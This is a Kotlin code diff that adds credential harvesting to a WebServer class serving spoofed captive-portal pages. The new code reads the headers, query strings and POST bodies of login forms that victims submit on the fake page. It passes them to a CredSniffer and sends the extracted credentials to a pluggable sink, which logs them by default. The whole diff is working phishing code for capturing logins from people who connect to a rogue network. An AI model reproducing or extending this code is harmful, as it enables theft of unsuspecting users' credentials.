@@ -48,6 +48,10 @@ class WebServer {
     @Volatile private var cfg = SpoofConfig()
     @Volatile private var docRoot: File? = null
     @Volatile private var singleHtml: File? = null
+    @Volatile private var onCred: (String) -> Unit = { addLog(it) }
+
+    /** Route harvested credentials somewhere visible (defaults to this server's own log). */
+    fun setCredSink(sink: (String) -> Unit) { onCred = sink }
 
     private val probeHosts = listOf(
         "captive.apple.com", "connectivitycheck.gstatic.com", "connectivitycheck.android.com",
@@ -104,18 +108,52 @@ class WebServer {
                 val method = parts[0].uppercase(Locale.US)
                 val rawPath = parts[1]
                 var host = ""
+                var contentLength = 0
+                val headerLines = ArrayList<String>()
                 while (true) {
                     val h = reader.readLine() ?: break
                     if (h.isEmpty()) break
+                    headerLines += h
                     if (h.startsWith("Host:", ignoreCase = true)) {
                         host = h.substringAfter(":").trim().substringBefore(":").lowercase(Locale.US)
                     }
+                    if (h.startsWith("Content-Length:", ignoreCase = true)) {
+                        contentLength = h.substringAfter(":").trim().toIntOrNull() ?: 0
+                    }
                 }
+                // read the POST body (a submitted login form lands here on a captive/spoof page)
+                var body = ""
+                if (contentLength in 1..65536) {
+                    val cbuf = CharArray(contentLength)
+                    var read = 0
+                    while (read < contentLength) {
+                        val r = reader.read(cbuf, read, contentLength - read)
+                        if (r < 0) break
+                        read += r
+                    }
+                    body = String(cbuf, 0, read)
+                }
+                harvest(host.ifBlank { "spoof" }, rawPath, headerLines, body)
                 val path = rawPath.substringBefore('?')
                 route(s.getOutputStream(), method, host, path)
             } catch (_: Throwable) {
                 // drop
             }
+        }
+    }
+
+    /** Pull credentials out of a submitted form / auth header on our page and report them. */
+    private fun harvest(host: String, rawPath: String, headerLines: List<String>, body: String) {
+        try {
+            val ct = headerLines.firstOrNull { it.startsWith("content-type:", true) }
+                ?.substringAfter(':')?.trim() ?: ""
+            val found = ArrayList<String>()
+            found += CredSniffer.scanHeaders(host, headerLines)
+            val query = rawPath.substringAfter('?', "")
+            if (query.isNotBlank()) found += CredSniffer.scanBody(host, "", query)
+            found += CredSniffer.scanBody(host, ct, body)
+            found.forEach { onCred(it) }
+        } catch (_: Throwable) {
         }
     }
 
